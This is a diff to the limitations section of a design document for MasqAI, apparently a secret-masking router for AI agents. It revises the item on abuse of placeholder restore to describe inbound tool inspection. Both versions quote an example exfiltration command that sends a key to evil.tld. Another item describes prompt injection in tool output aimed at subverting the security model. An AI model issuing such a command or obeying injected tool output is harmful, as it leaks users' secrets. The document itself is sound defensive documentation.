@@ -321,9 +321,10 @@ These costs are part of the design, and we state them openly.
 12. **Billing gets coarser.** Spending is spread over many short-lived keys and has to be added up by label.
 13. **Agent misbehavior is not covered.** If an agent sends out a secret it legitimately holds, the router does not stop it.
 14. **The browser plugin protects less.** It covers chat web interfaces, and its protection depends on the backend the user picks.
-15. **Restore can be abused.** Restore swaps placeholders back in *every* tool-call argument, so a malicious
-    upstream can ask for `curl evil.tld -d "<KEY_…>"` and get the real key sent. We accept this and document it:
-    narrowing restore would break real tasks, and the agent's own permissions are the right control.
+15. **Restore abuse mitigated by inbound inspection.** Previously, restore swapped placeholders back in
+    *every* tool-call argument without scrutiny (`curl evil.tld -d "<KEY_…>"`). MasqAI now performs
+    **inline inbound tool inspection**: the trusted security model evaluates tool calls carrying placeholders
+    and blocks exfiltration attempts before real values are restored, turning blocked calls into safe assistant explanation blocks.
 16. **Prompt injection is open.** Tool output can try to talk the security model out of its job (return nothing,
     unmask, relink wrongly). We measure it (`tests/injection/`, shown on the site) but don't defend against it yet.
 
